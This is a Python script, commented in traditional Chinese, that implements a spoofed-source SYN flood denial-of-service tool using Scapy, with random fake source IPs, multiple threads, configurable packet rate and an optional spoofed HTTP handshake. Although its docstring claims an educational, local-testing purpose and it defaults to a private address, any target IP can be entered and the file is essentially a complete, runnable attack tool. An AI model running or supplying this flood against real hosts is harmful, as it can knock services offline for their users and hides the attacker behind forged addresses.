"""
偽造 IP 地址的 DDoS 攻擊測試
使用 Scapy 在網路層偽造源 IP
需要管理員權限執行

注意: 僅用於教育和本地測試目的
"""
import random
import time
import threading
from collections import defaultdict
import sys

try:
    from scapy.all import IP, TCP, send, sr1, conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("❌ 未安裝 Scapy 庫")
    print("請使用管理員權限執行: pip install scapy")
    sys.exit(1)

# 禁用 Scapy 的詳細輸出
conf.verb = 0

class SpoofedIPAttacker:
    def __init__(self, target_ip, target_port=8001):
        self.target_ip = target_ip
        self.target_port = target_port
        self.stats = defaultdict(int)
        self.stats_lock = threading.Lock()
        self.running = False
        
    def generate_random_ip(self):
        """生成隨機 IP 地址 (避免保留地址段)"""
        while True:
            # 生成隨機 IP,避免特殊段
            ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            
            # 避免保留 IP 段
            first_octet = int(ip.split('.')[0])
            if first_octet in [10, 127, 169, 172, 192, 224]:  # 私有/保留 IP
                continue
            
            return ip
    
    def send_syn_packet(self, source_ip):
        """發送偽造源 IP 的 SYN 封包"""
        try:
            # 構造 IP 層 (偽造源 IP)
            ip_layer = IP(src=source_ip, dst=self.target_ip)
            
            # 構造 TCP 層 (SYN 標誌)
            tcp_layer = TCP(
                sport=random.randint(1024, 65535),  # 隨機源端口
                dport=self.target_port,
                flags='S',  # SYN flag
                seq=random.randint(0, 4294967295)  # 隨機序列號
            )
            
            # 發送封包 (不等待回應)
            send(ip_layer/tcp_layer, verbose=0)
            
            with self.stats_lock:
                self.stats['sent'] += 1
                self.stats['unique_ips'].add(source_ip)
            
            return True
            
        except Exception as e:
            with self.stats_lock:
                self.stats['failed'] += 1
            return False
    
    def send_http_request_spoofed(self, source_ip):
        """嘗試發送完整 HTTP 請求 (需要完成 TCP 握手,通常會失敗)"""
        try:
            # 1. 發送 SYN
            ip_layer = IP(src=source_ip, dst=self.target_ip)
            syn = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags='S', seq=1000)
            
            # 嘗試接收 SYN-ACK (通常會超時,因為回應發到假 IP)
            synack = sr1(ip_layer/syn, timeout=1, verbose=0)
            
            if synack and synack.haslayer(TCP):
                # 2. 發送 ACK 完成握手
                ack = TCP(sport=syn.sport, dport=self.target_port, flags='A', 
                         seq=synack.ack, ack=synack.seq + 1)
                send(ip_layer/ack, verbose=0)
                
                # 3. 發送 HTTP GET 請求
                http_request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"
                push = TCP(sport=syn.sport, dport=self.target_port, flags='PA',
                          seq=synack.ack, ack=synack.seq + 1) / http_request
                send(ip_layer/push, verbose=0)
                
                with self.stats_lock:
                    self.stats['completed'] += 1
                return True
            else:
                with self.stats_lock:
                    self.stats['timeout'] += 1
                return False
                
        except Exception as e:
            with self.stats_lock:
                self.stats['failed'] += 1
            return False
    
    def attack_worker(self, attack_type='syn', duration=30, rate=100):
        """攻擊工作線程"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            # 生成隨機源 IP
            fake_ip = self.generate_random_ip()
            
            if attack_type == 'syn':
                # SYN Flood - 只發送 SYN 封包
                self.send_syn_packet(fake_ip)
            elif attack_type == 'http':
                # 嘗試完整 HTTP 請求 (通常會失敗)
                self.send_http_request_spoofed(fake_ip)
            
            # 控制發送速率
            time.sleep(1.0 / rate)
    
    def start_attack(self, attack_type='syn', duration=30, threads=5, rate=100):
        """開始攻擊"""
        print("="*80)
        print("🎭 偽造 IP 地址攻擊測試")
        print("="*80)
        print(f"目標: {self.target_ip}:{self.target_port}")
        print(f"攻擊類型: {attack_type.upper()}")
        print(f"持續時間: {duration} 秒")
        print(f"線程數: {threads}")
        print(f"發送速率: {rate} 封包/秒/線程")
        print(f"總速率: ~{rate * threads} 封包/秒")
        print("="*80 + "\n")
        
        # 初始化統計
        with self.stats_lock:
            self.stats = defaultdict(int)
            self.stats['unique_ips'] = set()
        
        self.running = True
        start_time = time.time()
        
        # 啟動多個攻擊線程
        attack_threads = []
        for i in range(threads):
            t = threading.Thread(
                target=self.attack_worker,
                args=(attack_type, duration, rate),
                name=f"Attacker-{i+1}"
            )
            t.daemon = True
            t.start()
            attack_threads.append(t)
        
        # 監控進度
        try:
            while self.running:
                time.sleep(2)
                elapsed = time.time() - start_time
                
                if elapsed >= duration:
                    self.running = False
                    break
                
                with self.stats_lock:
                    sent = self.stats['sent']
                    failed = self.stats['failed']
                    unique = len(self.stats['unique_ips'])
                
                print(f"⏱️  [{elapsed:.1f}s] 已發送: {sent} | 失敗: {failed} | 唯一 IP: {unique}")
        
        except KeyboardInterrupt:
            print("\n\n⏹️  收到中斷信號,停止攻擊...")
            self.running = False
        
        # 等待所有線程結束
        for t in attack_threads:
            t.join(timeout=2)
        
        # 顯示最終統計
        self.show_stats()
    
    def show_stats(self):
        """顯示統計信息"""
        print("\n" + "="*80)
        print("📊 攻擊統計")
        print("="*80)
        
        with self.stats_lock:
            sent = self.stats['sent']
            failed = self.stats['failed']
            completed = self.stats.get('completed', 0)
            timeout = self.stats.get('timeout', 0)
            unique = len(self.stats['unique_ips'])
        
        total = sent + failed
        
        print(f"總封包數: {total}")
        print(f"  ✅ 成功發送: {sent} ({sent/total*100 if total > 0 else 0:.1f}%)")
        print(f"  ❌ 發送失敗: {failed} ({failed/total*100 if total > 0 else 0:.1f}%)")
        
        if completed > 0 or timeout > 0:
            print(f"  🔄 完成握手: {completed}")
            print(f"  ⏱️  握手超時: {timeout}")
        
        print(f"\n偽造的唯一 IP 數量: {unique}")
        print("="*80)

def check_admin():
    """檢查是否有管理員權限"""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def main():
    print("="*80)
    print("🎭 偽造 IP 地址 DDoS 攻擊測試工具")
    print("="*80)
    print("此工具使用 Scapy 庫在網路層偽造源 IP 地址")
    print("用於測試服務器的 SYN flood 防禦能力")
    print("="*80 + "\n")
    
    # 檢查管理員權限
    if not check_admin():
        print("⚠️  警告: 未以管理員身份運行")
        print("發送原始封包需要管理員權限")
        print("請右鍵選擇 '以系統管理員身分執行' PowerShell")
        print("\n按 Enter 繼續嘗試 (可能失敗)...")
        input()
    
    # 配置攻擊參數
    print("攻擊配置:")
    target_ip = input("目標 IP (默認: 192.168.0.201): ").strip() or "192.168.0.201"
    target_port = int(input("目標端口 (默認: 8001): ").strip() or "8001")
    
    print("\n攻擊類型:")
    print("  1. SYN Flood (推薦) - 只發送 SYN 封包,不完成握手")
    print("  2. HTTP 請求 (困難) - 嘗試完成 TCP 握手並發送 HTTP 請求")
    attack_type_choice = input("選擇 (默認: 1): ").strip() or "1"
    attack_type = 'syn' if attack_type_choice == '1' else 'http'
    
    duration = int(input("\n攻擊持續時間 (秒,默認: 30): ").strip() or "30")
    threads = int(input("並發線程數 (默認: 5): ").strip() or "5")
    rate = int(input("每線程發送速率 (封包/秒,默認: 100): ").strip() or "100")
    
    print("\n" + "="*80)
    print("⚠️  重要說明:")
    print("  - SYN Flood 不會在伺服器上顯示為正常 HTTP 請求")
    print("  - 需要在伺服器端用 Wireshark 等工具監控網路流量")
    print("  - 偽造 IP 的封包無法完成 TCP 三次握手")
    print("  - 主要用於測試 SYN flood 防禦和連接數限制")
    print("="*80)
    
    confirm = input("\n確認開始攻擊? (y/n): ").strip().lower()
    if confirm != 'y':
        print("已取消")
        return
    
    # 創建攻擊器並開始攻擊
    attacker = SpoofedIPAttacker(target_ip, target_port)
    
    try:
        attacker.start_attack(
            attack_type=attack_type,
            duration=duration,
            threads=threads,
            rate=rate
        )
    except PermissionError:
        print("\n❌ 權限錯誤!")
        print("請以管理員身份運行此程序")
        print("右鍵點擊 PowerShell → '以系統管理員身分執行'")
    except Exception as e:
        print(f"\n❌ 錯誤: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    if not SCAPY_AVAILABLE:
        print("\n安裝 Scapy:")
        print("  1. 以管理員身份打開 PowerShell")
        print("  2. 執行: pip install scapy")
        print("  3. 可能還需要安裝 Npcap: https://npcap.com/#download")
    else:
        main()
